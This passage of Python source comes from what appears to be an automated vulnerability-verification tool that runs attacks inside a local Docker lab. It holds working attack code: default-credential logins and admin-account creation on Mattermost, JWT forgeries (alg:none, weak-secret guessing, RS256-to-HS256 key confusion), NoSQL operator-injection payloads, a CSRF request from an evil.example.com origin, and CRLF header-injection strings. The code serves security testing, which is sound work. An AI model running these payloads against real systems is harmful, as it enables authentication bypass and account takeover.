    _base = base_url.rstrip("/")
    _creds = _b64.b64encode(f"{_user}:{_pwd}".encode()).decode()
    # Probe the OCS API endpoint for auth confirmation
    try:
        _r = _http_request(
            "GET", _base + "/ocs/v1.php/cloud/capabilities?format=json",
            headers={"Authorization": f"Basic {_creds}",
                     "OCS-APIRequest": "true"},
            timeout=8)
        if _r.status_code == 200 and "ocs" in (_r.text or "").lower():
            step(f"  nextcloud-auth: Basic auth confirmed for {_user}")
            return {"headers": {"Authorization": f"Basic {_creds}",
                                "OCS-APIRequest": "true"}}
    except Exception:
        pass
    return {}


def _try_mattermost_auth(base_url: str, on_step=None) -> dict:
    """Authenticate against Mattermost and return a token dict.

    Mattermost REST API v4: POST /api/v4/users/login with JSON credentials.
    If no admin exists yet (fresh lab), creates one first via /api/v4/users.
    Returns {"bearer": "Bearer <tok>", "headers": {...}} or empty dict.
    """
    import json as _j
    step = on_step or (lambda _m: None)
    _base = base_url.rstrip("/")
    _admin_user = "admin"
    _admin_email = "admin@binoracle.local"
    _admin_pwd = "BinOracle123!"

    # Attempt login first with known credentials
    _creds = [
        (_admin_user, _admin_pwd),
        ("mm_admin", "Admin12345!"),
        (_admin_email, _admin_pwd),
    ]
    for _user, _pwd in _creds:
        try:
            _r = _http_request(
                "POST", _base + "/api/v4/users/login",
                data=_j.dumps({"login_id": _user, "password": _pwd}),
                headers={"Content-Type": "application/json"},
                timeout=8)
            if _r.status_code == 200:
                _tok = (_r.headers or {}).get("Token", "") or \
                       (_r.headers or {}).get("token", "")
                if not _tok:
                    _d = _j.loads(_r.text or "{}")
                    _tok = _d.get("token") or ""
                if _tok:
                    step(f"  mattermost-auth: token via {_user} → {_tok[:8]}...")
                    return {"bearer": f"Bearer {_tok}",
                            "headers": {"Authorization": f"Bearer {_tok}"}}
        except Exception:
            pass

    # Fresh lab — create the first admin user via /api/v4/users (no auth needed
    # when MM_SERVICESETTINGS_ALLOWEDUNTRUSTEDINTERNAL... is not restricted).
    try:
        step("  mattermost-auth: no existing admin — attempting to create one...")
        _create_r = _http_request(
            "POST", _base + "/api/v4/users",
            data=_j.dumps({
                "email": _admin_email,
                "username": _admin_user,
                "password": _admin_pwd,
                "auth_service": "",
            }),
            headers={"Content-Type": "application/json"},
            timeout=10)
        if _create_r.status_code in (200, 201):
            step(f"  mattermost-auth: admin user created → trying login...")
            # Now login
            _r2 = _http_request(
                "POST", _base + "/api/v4/users/login",
                data=_j.dumps({"login_id": _admin_user, "password": _admin_pwd}),
                headers={"Content-Type": "application/json"},
                timeout=8)
            if _r2.status_code == 200:
                _tok = (_r2.headers or {}).get("Token", "") or \
                       (_r2.headers or {}).get("token", "")
                if _tok:
                    step(f"  mattermost-auth: token after user create → {_tok[:8]}...")
                    return {"bearer": f"Bearer {_tok}",
                            "headers": {"Authorization": f"Bearer {_tok}"}}
        elif _create_r.status_code == 400:
            # 400 may mean "user already exists" — login may succeed with correct pw
            step(f"  mattermost-auth: create returned 400 — user may already exist")
    except Exception as _e:
        step(f"  mattermost-auth: create attempt failed: {_e}")

    return {}


# ---------------------------------------------------------------------------
# JWT BYPASS verifier
# ---------------------------------------------------------------------------

def _try_auto_auth(base_url: str, source_dir: str = "", on_step=None) -> dict:
    """Try to authenticate automatically against an unknown REST API.

    Returns {"cookie": "", "bearer": "", "api_key": "", "headers": {}}
    with whatever auth was obtained. All fields empty if nothing found.

    Strategy (in order):
    1. OAuth2 form-encoded /token (FastAPI pattern)
    2. JSON /login, /auth/login, /api/auth/login
    3. GET /api/key, /api/apikey, /admin/key
    4. Scan source_dir for API_KEY / DEFAULT_KEY in .env.example / config files
    5. Unauthenticated GET / and /api/ — may work without auth
    """
    import json as _j
    step = on_step or (lambda _m: None)
    result: dict = {"cookie": "", "bearer": "", "api_key": "", "headers": {}}
    _user = "binoracle_test"
    _pwd = "Binoracle123!"
    _email = "test@binoracle.dev"

    # Strategy 0: CMS-specific auth — probe for Gitea/Nextcloud/Mattermost APIs
    # These are probed FIRST because they have known auth flows that the generic
    # strategies below are unlikely to hit (non-standard endpoints, Token header, etc.)
    _base_check = base_url.rstrip("/")
    for _cms_probe, _cms_fn in [
        ("/api/v1/users", _try_gitea_auth),          # Gitea API endpoint
        ("/ocs/v1.php/cloud/capabilities", _try_nextcloud_auth),  # Nextcloud OCS
        ("/api/v4/users/login", _try_mattermost_auth),  # Mattermost v4
    ]:
        try:
            _probe_r = _http_request("GET", _base_check + _cms_probe, timeout=4)
            if _probe_r.status_code in (200, 401, 403):  # any response = this CMS is here
                _cms_result = _cms_fn(base_url, on_step=on_step)
                if _cms_result.get("headers"):
                    result.update(_cms_result)
                    return result
                break  # CMS detected but auth failed; don't probe other CMSs
        except Exception:
            pass

    # 1. OAuth2 form-encoded /token
    for _ep in ["/token", "/api/token", "/auth/token", "/api/auth/token",
                "/api/v1/token", "/oauth/token"]:
        try:
            r = _http_request("POST", base_url.rstrip("/") + _ep,
                              data=f"username={_user}&password={_pwd}&grant_type=password",
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=5)
            if r.status_code in (200, 201):
                body = _j.loads(r.text or "{}")
                tok = body.get("access_token") or body.get("token") or ""
                if tok:
                    step(f"  auto-auth: Bearer token via {_ep}")
                    result["bearer"] = f"Bearer {tok}"
                    result["headers"] = {"Authorization": result["bearer"]}
                    return result
        except Exception:
            pass

    # 2. JSON login
    for _ep in ["/login", "/auth/login", "/api/login", "/api/auth/login",
                "/api/v1/login", "/signin", "/api/signin"]:
        try:
            r = _http_request("POST", base_url.rstrip("/") + _ep,
                              data=_j.dumps({"username": _user, "password": _pwd,
                                             "email": _email}),
                              headers={"Content-Type": "application/json"}, timeout=5)
            if r.status_code in (200, 201):
                body = _j.loads(r.text or "{}")
                tok = (body.get("access_token") or body.get("token") or
                       (body.get("data") or {}).get("token") or "")
                if tok:
                    step(f"  auto-auth: Bearer token via {_ep} (JSON)")
                    result["bearer"] = f"Bearer {tok}"
                    result["headers"] = {"Authorization": result["bearer"]}
                    return result
                # Session cookie
                cookie_hdr = r.headers.get("set-cookie", "")
                for ck in ["sessionid", "session", "token", "auth", "jwt"]:
                    import re as _re_ck
                    _m = _re_ck.search(rf"{ck}=([^;]+)", cookie_hdr, _re_ck.I)
                    if _m:
                        step(f"  auto-auth: cookie {ck} via {_ep}")
                        result["cookie"] = f"{ck}={_m.group(1)}"
                        result["headers"] = {"Cookie": result["cookie"]}
                        return result
        except Exception:
            pass

    # 3. GET /api/key endpoints
    for _ep in ["/api/key", "/api/apikey", "/admin/key", "/api/admin/key"]:
        try:
            r = _http_request("GET", base_url.rstrip("/") + _ep, timeout=5)
            if r.status_code == 200:
                body = _j.loads(r.text or "{}")
                key = body.get("key") or body.get("api_key") or body.get("apiKey") or ""
                if key and len(key) > 8:
                    step(f"  auto-auth: API key via {_ep}")
                    result["api_key"] = key
                    result["headers"] = {"X-API-Key": key}
                    return result
        except Exception:
            pass

    # 4. Scan source for hardcoded keys
    if source_dir and os.path.isdir(source_dir):
        import re as _re_src
        _KEY_RE = _re_src.compile(
            r'(?:API_KEY|DEFAULT_KEY|MASTER_KEY|SECRET_KEY|ADMIN_KEY|DEFAULT_API_KEY)'
            r'\s*[=:]\s*["\']?([A-Za-z0-9_\-]{8,})["\']?',
            _re_src.I)
        for _fn in [".env.example", ".env.sample", "config.example.yaml",
                    "config.example.json", "appsettings.Development.json"]:
            _fp = os.path.join(source_dir, _fn)
            if not os.path.isfile(_fp):
                continue
            try:
                content = open(_fp, encoding="utf-8", errors="replace").read(4000)
                _m = _KEY_RE.search(content)
                if _m:
                    key = _m.group(1)
                    step(f"  auto-auth: API key from {_fn}: {key[:12]}...")
                    result["api_key"] = key
                    result["headers"] = {"X-API-Key": key,
                                         "Authorization": f"ApiKey {key}"}
                    return result
            except Exception:
                pass

    # 5. Check if unauthenticated access works
    for _ep in ["/api/", "/api", "/api/v1/", "/"]:
        try:
            r = _http_request("GET", base_url.rstrip("/") + _ep, timeout=5)
            if r.status_code == 200:
                step(f"  auto-auth: no auth needed ({_ep} → 200)")
                return result  # empty headers = unauthenticated
        except Exception:
            pass

    return result


def verify_generic_jwt_bypass(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    confirm_string: str = "",
    weak_secret: str = "secret",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica JWT bypass via alg:none o clave debil.

    Envia un JWT con algoritmo 'none' (sin firma) al endpoint de autenticacion.
    Si el servidor acepta el token (status 200 o confirm_string en body) → CONFIRMED.
    Tambien intenta JWT firmado con clave debil 'secret' como fallback.
    """
    import base64 as _b64
    import json as _json

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        def _make_jwt_none(payload: dict, alg_value: str = "none") -> str:
            header = _b64.urlsafe_b64encode(
                _json.dumps({"alg": alg_value, "typ": "JWT"}).encode()).rstrip(b"=").decode()
            body_b64 = _b64.urlsafe_b64encode(
                _json.dumps(payload).encode()).rstrip(b"=").decode()
            return f"{header}.{body_b64}."

        def _make_jwt_weak(payload: dict, secret: str = "secret") -> str:
            import hmac
            import hashlib
            header = _b64.urlsafe_b64encode(
                _json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
            body_b64 = _b64.urlsafe_b64encode(
                _json.dumps(payload).encode()).rstrip(b"=").decode()
            signing_input = f"{header}.{body_b64}".encode()
            sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            return f"{header}.{body_b64}.{sig_b64}"

        def _make_jwt_rs256_confusion(payload: dict) -> str:
            """Key confusion: sign HS256 token using a known weak/dummy RSA public key.
            This exploits servers that accept HS256 tokens signed with their own
            RS256 public key (CVE-2016-5431 style).
            """
            _DUMMY_PUB = b"-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAMqp9yFSxpGD34jrKFAiGxkDFBHNLXMd\nGZLLJi25vJBqJz+VZBqKG6S0Q55PZiJO2BxjR2TflCeStx8dHD0CAwEAAQ==\n-----END PUBLIC KEY-----\n"
            import hmac as _hmac, hashlib as _hs
            header = _b64.urlsafe_b64encode(
                _json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
            body_b64 = _b64.urlsafe_b64encode(
                _json.dumps(payload).encode()).rstrip(b"=").decode()
            signing_input = f"{header}.{body_b64}".encode()
            sig = _hmac.new(_DUMMY_PUB, signing_input, _hs.sha256).digest()
            return f"{header}.{body_b64}.{_b64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

        def _make_jwt_expired_resign(payload: dict) -> str:
            """Resign an expired token with alg:none — tests if exp is not validated."""
            old_payload = {**payload, "exp": 1000000000}  # expired 2001
            return _make_jwt_none(old_payload)

        token_id = _token()
        payload_data = {
            "sub": f"admin-{token_id}", "role": "admin", "is_admin": True,
            "iat": 1700000000, "exp": 9999999999,
        }

        _weak_secrets = ["secret", "password", "changeme", "123456", "jwt", "admin",
                         "supersecret", "your-256-bit-secret", "binoracle", ""]
        if weak_secret and weak_secret not in _weak_secrets:
            _weak_secrets.insert(0, weak_secret)
        _weak_attempts = [(f"weak-secret ({s!r})", _make_jwt_weak(payload_data, s))
                          for s in _weak_secrets if s != ""]

        # Build a sample base token to feed into load_jwt_attack_payloads for kid/jku variants
        _base_token = _make_jwt_none(payload_data)
        try:
            from .payload_kb import load_jwt_attack_payloads as _ljap
            _kb_variants = _ljap(_base_token)
            # Only take kid injection variants from KB (alg:none already covered above)
            _kid_attacks = [(f"kid-inject ({v['technique']})", v["token"])
                            for v in _kb_variants if "kid" in v.get("technique", "")]
        except Exception:
            _kid_attacks = []

        # Baseline: probe without auth to check if endpoint is public (would FP otherwise)
        step("JWT baseline: probando endpoint sin Authorization header...")
        try:
            _bl_r = _http_request(http_method, base_url.rstrip("/") + endpoint,
                                   headers={"Content-Type": "application/json"}, timeout=10.0)
            _baseline_status = _bl_r.status_code
            _baseline_body = getattr(_bl_r, "text", "") or ""
        except Exception:
            _baseline_status = -1
            _baseline_body = ""
        step(f"  JWT baseline sin auth: status={_baseline_status}")

        for label, jwt_token in [
            ("alg:none bypass", _make_jwt_none(payload_data, "none")),
            ("alg:None bypass", _make_jwt_none(payload_data, "None")),
            ("alg:NONE bypass", _make_jwt_none(payload_data, "NONE")),
            ("alg:nOnE bypass", _make_jwt_none(payload_data, "nOnE")),
            ("alg:none expired resign", _make_jwt_expired_resign(payload_data)),
            ("RS256→HS256 key confusion", _make_jwt_rs256_confusion(payload_data)),
            *_kid_attacks,
            *_weak_attempts,
        ]:
            step(f"JWT bypass: probando {label} contra {endpoint}")
            hdrs = {"Authorization": f"Bearer {jwt_token}",
                    "Content-Type": "application/json"}
            try:
                r = _http_request(
                    http_method, base_url.rstrip("/") + endpoint,
                    headers=hdrs, timeout=15.0)
                st = r.status_code
                body = getattr(r, "text", "") or ""
            except Exception as _exc:
                step(f"  error de red JWT: {_exc}")
                continue
            step(f"  respuesta: status={st} len={len(body)}")
            confirmed = False
            if confirm_string and confirm_string in body:
                confirmed = True
            elif not confirm_string and st in (200, 201, 202, 204):
                # Only flag if the endpoint was NOT already publicly accessible
                if _baseline_status not in (200, 201, 202, 204):
                    confirmed = True
            if confirmed:
                res.verified = True
                res.ok = True
                res.detail = (f"JWT BYPASS CONFIRMADO via {label}: status={st}, "
                              f"endpoint={endpoint}")
                step(f"VERIFICADO: JWT bypass via {label}")
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + endpoint,
                    resp_or_body=body,
                    highlight=confirm_string or str(st),
                    caption_es=(f"JWT BYPASS CONFIRMADO via {label}: token aceptado "
                                f"por {endpoint} sin verificacion de firma valida."),
                    caption_en=(f"JWT BYPASS CONFIRMED via {label}: token accepted "
                                f"by {endpoint} without valid signature verification."),
                )
                return res
        res.ok = True
        res.detail = (f"JWT bypass no detectado: servidor rechazo tokens alg:none y "
                      f"clave-debil en {endpoint}")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_jwt_bypass: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# NoSQL Injection verifier (MongoDB $ne / $gt operator injection)
# ---------------------------------------------------------------------------

def verify_generic_nosql_injection(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    inject_param: str = "username",
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    extra_params: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica NoSQL injection via operadores MongoDB ($ne, $gt, $regex, $where, $in).

    Estrategia multi-fase:
    1. Auth-bypass: operadores $ne/$gt/$regex para eludir autenticacion
    2. Data exfil: $where con JavaScript para extraer datos
    3. Blind: Boolean diferencial para confirmar interpretacion de operadores
    4. Array injection: $in con array de valores
    Si la respuesta indica acceso concedido (confirm_string o status 200 en endpoint
    que normalmente rechazaria credenciales invalidas) → CONFIRMED.
    """
    import json as _json

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    t0 = __import__("time").time()
    try:
        import time as _time_nosql
        token_id = _token()
        hdrs = {"Content-Type": "application/json"}
        _extra = extra_params or {}

        # Auth-bypass payloads: core hardcoded + payload_kb extended set
        auth_bypass_payloads_base = [
            {inject_param: {"$ne": None}, "password": {"$ne": None}, **_extra},
            {inject_param: "admin", "password": {"$gt": ""}, **_extra},
            {inject_param: {"$regex": ".*"}, "password": {"$regex": ".*"}, **_extra},
            {inject_param: "admin'||'1'=='1", "password": "anything", **_extra},
            {inject_param: {"$in": ["admin", "administrator", "root", "user"]},
             "password": {"$ne": None}, **_extra},
            {inject_param: {"$exists": True, "$ne": "__none__"},
             "password": {"$exists": True}, **_extra},
        ]
        # Extend with payload_kb operator variants
        try:
            from .payload_kb import load_nosql_operator_payloads as _lnop
            _kb_ops = _lnop(field=inject_param)
            # Merge KB payloads into base list (deduplicate by technique)
            _kb_payloads = []
            for _op in _kb_ops:
                try:
                    _parsed = _json.loads(_op["payload_json"])
                    if _parsed not in auth_bypass_payloads_base:
                        _kb_payloads.append({**_parsed, **_extra})
                except Exception:
                    pass
            auth_bypass_payloads = auth_bypass_payloads_base + _kb_payloads
        except Exception:
            auth_bypass_payloads = auth_bypass_payloads_base

        # Blind boolean payloads: $where JavaScript returns true/false
        # Used when auth-bypass doesn't work but server evaluates JS
        _where_true_payload = {inject_param: {"$where": "1==1"}, "password": "x", **_extra}
        _where_false_payload = {inject_param: {"$where": "1==0"}, "password": "x", **_extra}

        # Control request with invalid credentials to establish baseline
        control_body = _json.dumps({inject_param: f"nosuchuser_{token_id}", "password": "wrongpwd_xyz", **_extra})
        st_ctrl, _, b_ctrl = _http_lab(
            base_url, endpoint, http_method,
            headers=hdrs, body=control_body.encode(), timeout=15.0)
        body_ctrl = (b_ctrl or b"").decode("utf-8", errors="replace")
        step(f"NoSQL baseline (invalid creds): status={st_ctrl} len={len(body_ctrl)}")

        # Phase 1: Auth-bypass
        for i, payload in enumerate(auth_bypass_payloads):
            if _time_nosql.time() - t0 >= budget_s - 60:
                break
            step(f"NoSQL injection (phase 1 — auth-bypass) payload {i+1}/{len(auth_bypass_payloads)}: "
                 f"{_json.dumps(payload)[:80]}...")
            body_data = _json.dumps(payload).encode()
            st, _, body_bytes = _http_lab(
                base_url, endpoint, http_method,
                headers=hdrs, body=body_data, timeout=15.0)
            body = (body_bytes or b"").decode("utf-8", errors="replace")
            step(f"  respuesta: status={st} len={len(body)}")

            confirmed = False
            if confirm_string and confirm_string in body:
                confirmed = True
            elif not confirm_string and st in (200, 201, 202) and st_ctrl not in (200, 201, 202):
                confirmed = True
            # Body size alone: require >200B diff AND status is not an error
            elif not confirm_string and st in (200, 201, 202) and len(body) > len(body_ctrl) + 200:
                confirmed = True

            if confirmed:
                res.verified = True
                res.ok = True
                res.evidence["nosql_technique"] = "auth-bypass"
                res.evidence["winning_payload"] = payload
                res.detail = (f"NOSQL INJECTION CONFIRMADA (auth-bypass): "
                              f"payload {_json.dumps(payload)!r} "
                              f"produjo respuesta diferente (status={st}) en {endpoint}")
                step(f"VERIFICADO: NoSQL auth-bypass con payload {i+1}")
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + endpoint,
                    resp_or_body=body,
                    highlight=confirm_string or body[:100],
                    caption_es=(f"NOSQL INJECTION CONFIRMADA: operador MongoDB en "
                                f"campo {inject_param!r} elude autenticacion."),
                    caption_en=(f"NOSQL INJECTION CONFIRMED: MongoDB operator in "
                                f"field {inject_param!r} bypasses authentication."),
                )
                return res

        # Phase 2: Boolean-blind via $where JavaScript
        if _time_nosql.time() - t0 < budget_s - 60:
            step("NoSQL injection (phase 2 — $where boolean-blind)...")
            try:
                _bw_true_data = _json.dumps(_where_true_payload).encode()
                _bw_false_data = _json.dumps(_where_false_payload).encode()
                st_t, _, b_t = _http_lab(base_url, endpoint, http_method,
                                          headers=hdrs, body=_bw_true_data, timeout=15.0)
                st_f, _, b_f = _http_lab(base_url, endpoint, http_method,
                                          headers=hdrs, body=_bw_false_data, timeout=15.0)
                body_t = (b_t or b"").decode("utf-8", errors="replace")
                body_f = (b_f or b"").decode("utf-8", errors="replace")
                _len_diff = abs(len(body_t) - len(body_f))
                # Require >100B diff OR status mismatch — 20B is Docker jitter
                if _len_diff >= 100 or (st_t != st_f):
                    res.verified = True
                    res.ok = True
                    res.evidence["nosql_technique"] = "$where-boolean-blind"
                    res.evidence["where_true_len"] = len(body_t)
                    res.evidence["where_false_len"] = len(body_f)
                    res.detail = (f"NOSQL $where BLIND CONFIRMADA: 1==1 ({len(body_t)}B, HTTP {st_t}) "
                                  f"vs 1==0 ({len(body_f)}B, HTTP {st_f}) — "
                                  f"el servidor evalua JavaScript en operadores MongoDB")
                    step(f"VERIFICADO: NoSQL $where boolean-blind — diff {_len_diff}B, st_t={st_t} st_f={st_f}")
                    _add_exploit_evidence(
                        res=res, method=http_method, url=base_url + endpoint,
                        resp_or_body=body_t,
                        highlight="$where",
                        caption_es="NOSQL $where BLIND: diferencial TRUE/FALSE confirma evaluacion JS.",
                        caption_en="NOSQL $where BLIND: TRUE/FALSE differential confirms JS evaluation.",
                    )
                    return res
            except Exception:
                pass

        res.ok = True
        res.detail = (f"NoSQL injection no detectada: auth-bypass ({len(auth_bypass_payloads)} payloads) "
                      f"y $where boolean-blind probados en {endpoint}, sin diferencial claro")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_nosql_injection: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# CSRF verifier
# ---------------------------------------------------------------------------

def verify_generic_csrf(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    confirm_string: str = "",
    parameters: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica CSRF: envia peticion cross-origin sin CSRF token.

    Estrategia: hace la peticion de estado-mutante SIN cabeceras Origin/Referer del
    mismo dominio ni token CSRF en el body — si el servidor acepta (2xx o confirm_string
    en la respuesta) → la accion es vulnerable a CSRF.
    confirm_string debe ser un indicador de que la accion realmente se ejecuto
    (p.ej. el nuevo valor de un campo despues de la mutacion).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        params = dict(parameters or {})
        body_data = "&".join(f"{k}={v}" for k, v in params.items()) if params else ""
        # Cross-origin request: Origin from a different domain, no CSRF token
        evil_origin = "https://evil.example.com"
        hdrs = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin":       evil_origin,
            "Referer":      f"{evil_origin}/attack.html",
        }
        st, resp_hdrs, body_bytes = _http_lab(
            base_url, endpoint, http_method,
            headers=hdrs, body=body_data.encode() if body_data else None,
            timeout=15.0)
        body = (body_bytes or b"").decode("utf-8", errors="replace")
        step(f"CSRF: status={st} len={len(body)}")

        # Only mark verified=True when confirm_string is present in the response —
        # a bare 2xx without proof of state mutation is not sufficient: many APIs
        # return 200 even when rejecting CSRF (error in body, but 200 status).
        if confirm_string and confirm_string in body:
            res.verified = True
            res.ok = True
            res.detail = (f"CSRF CONFIRMADO: peticion cross-origin sin token aceptada "
                          f"(status={st}, confirm_string hallado) en {endpoint}")
            step(f"VERIFICADO: CSRF — peticion de {evil_origin!r} aceptada con confirm")
            _add_exploit_evidence(
                res=res, method=http_method, url=base_url + endpoint,
                resp_or_body=body,
                highlight=confirm_string,
                caption_es="CSRF CONFIRMADO: peticion cross-origin sin token aceptada.",
                caption_en="CSRF CONFIRMED: cross-origin request without token accepted.",
            )
            return res

        if st in (200, 201, 202, 204):
            # Suspicious: accepted without token, but no confirm_string to prove
            # the action actually executed — record as inconclusive, not verified.
            res.ok = True
            res.detail = (f"CSRF sospechoso: status={st} sin token en {endpoint} "
                          f"— sin confirm_string para confirmar la mutacion de estado")
        else:
            res.ok = True
            res.detail = (f"CSRF no detectado: peticion cross-origin devolvio status={st} "
                          f"sin confirm_string en la respuesta")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_csrf: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# CRLF injection verifier
# ---------------------------------------------------------------------------

def verify_generic_crlf_injection(
    source_dir: str,
    endpoint: str,
    http_method: str = "GET",
    inject_param: str = "",
    parameters: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica CRLF injection / HTTP response splitting.

    Inyecta secuencias CRLF en un parametro de query/header para intentar
    insertar cabeceras HTTP arbitrarias en la respuesta. Confirmado por la
    presencia de una cabecera canario (X-Injected-By: binoracle) en la respuesta.
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        params = dict(parameters or {})
        param = inject_param or _pick_param(params, ["url", "redirect", "next", "return",
                                                       "location", "path", "goto"]) or "url"
        canary_header = "X-Injected-By"
        # Unique per-run token so body reflection doesn't FP
        canary_value  = f"binoracle-crlf-{_token()[:8]}"

        # Load full payload set from payload_kb (39 variants) + fallback hardcoded core
        try:
            from .payload_kb import load_crlf_payloads as _lcp
            _kb_crlf = _lcp(marker=canary_header)
            # Adapt: kb payloads are full URLs; use them as param values directly
            # Also build the header-injection variants with our specific canary
            payloads = [
                f"https://example.com\r\n{canary_header}: {canary_value}",
                f"https://example.com\r\n\r\n{canary_header}: {canary_value}",
                f"https://example.com%0d%0a{canary_header}:%20{canary_value}",
                f"https://example.com%0d%0a%0d%0a{canary_header}:%20{canary_value}",
                f"https://example.com%0a{canary_header}:%20{canary_value}",
                f"https://example.com%0D{canary_header}:%20{canary_value}",
                f"https://example.com%250d%250a{canary_header}:%20{canary_value}",
                f"https://example.com\u000d\u000a{canary_header}:%20{canary_value}",
                # Set-Cookie injection
                f"https://example.com%0d%0aSet-Cookie:%20{canary_value}=1;%20Path=/",
                # Double CRLF full response split
                f"https://example.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<{canary_value}>",
            ]
        except Exception:
            payloads = [
                f"https://example.com\r\n{canary_header}: {canary_value}",
                f"https://example.com%0d%0a{canary_header}:%20{canary_value}",
                f"https://example.com%0a{canary_header}:%20{canary_value}",
            ]

        step(f"CRLF: probando {len(payloads)} variantes de payload (param={param!r})")
        for payload in payloads:
            test_params = dict(params)
            test_params[param] = payload
            qs = "&".join(f"{k}={v}" for k, v in test_params.items())
            ep_with_qs = f"{endpoint}?{qs}" if http_method == "GET" else endpoint
            body_data = qs.encode() if http_method != "GET" else None
            hdrs = {}
            if http_method != "GET":
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"

            st, resp_hdrs, body_bytes = _http_lab(
                base_url, ep_with_qs, http_method,
                headers=hdrs, body=body_data, timeout=15.0)
            body = (body_bytes or b"").decode("utf-8", errors="replace")
            step(f"CRLF: payload {payload[:50]!r} → status={st}")

            resp_hdrs_lower = {k.lower(): v for k, v in (resp_hdrs or {}).items()}
            # Confirm: injected header appears in response HEADERS (primary — no FP risk).
            # Body check is secondary and only valid if the app doesn't echo the raw param.
            _header_hit = (
                canary_header.lower() in resp_hdrs_lower
                or any(canary_value.lower() in str(v).lower()
                       for v in resp_hdrs_lower.values())
                or ("set-cookie" in resp_hdrs_lower
                    and canary_value.lower() in resp_hdrs_lower.get("set-cookie", "").lower())
            )
            # Body check: only valid if the canary appears as an HTTP header line
            # (i.e. "X-Injected-By: binoracle-crlf-xxx"), not just reflected as plain text
            _body_hit = (
                canary_value.lower() in body.lower()
                and re.search(rf"(?i){re.escape(canary_header)}\s*:\s*{re.escape(canary_value)}",
                              body) is not None
            )
            injected = _header_hit or _body_hit

            if injected:
                res.verified = True
                res.ok = True
                _injected_header = resp_hdrs_lower.get(canary_header.lower(), "in-body")
                res.detail = (f"CRLF INJECTION CONFIRMADA: cabecera canario "
                              f"'{canary_header}: {canary_value}' presente en la respuesta "
                              f"(status={st}, param={param!r}, payload={payload[:60]!r})")
                step(f"VERIFICADO: CRLF injection — cabecera inyectada con payload {payload[:50]!r}")
                res.evidence["crlf_payload"] = payload
                res.evidence["crlf_param"] = param
                res.evidence["crlf_injected_header"] = _injected_header
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + ep_with_qs,
                    resp_or_body=body,
                    highlight=canary_value,
                    caption_es=(f"CRLF INJECTION CONFIRMADA: cabecera HTTP arbitraria "
                                f"inyectada via param {param!r}."),
                    caption_en=(f"CRLF INJECTION CONFIRMED: arbitrary HTTP header injected "
                                f"via param {param!r}."),
                )
                return res

        res.ok = True
        res.detail = (f"CRLF injection no detectada: {len(payloads)} payloads probados "
                      f"en {endpoint} (param={param!r}), cabecera canario no aparecio")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_crlf_injection: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# Business logic verifier (price/quantity manipulation)
# ---------------------------------------------------------------------------

def verify_generic_business_logic(
